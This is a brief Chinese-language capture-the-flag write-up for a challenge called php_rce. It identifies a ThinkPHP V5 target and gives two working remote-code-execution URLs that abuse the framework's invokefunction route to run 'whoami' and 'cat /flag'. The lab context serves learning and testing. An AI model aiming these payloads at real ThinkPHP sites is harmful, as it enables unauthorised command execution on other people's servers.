# php_rce

首先进入环境发现是ThinkPHP V5，之前有做到过类似的，这个版本有漏洞，这是相关文章https://learnku.com/articles/21227

![image-20240323182540078](%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%A2%98%E8%A7%A3.assets/image-20240323182540078.png)

```
http://61.147.171.105:54705/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

直接构造payload![image-20240323182633845](%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%A2%98%E8%A7%A3.assets/image-20240323182633845.png)

```
http://61.147.171.105:54705/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag
```

![image-20240323182709961](%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%A2%98%E8%A7%A3.assets/image-20240323182709961.png)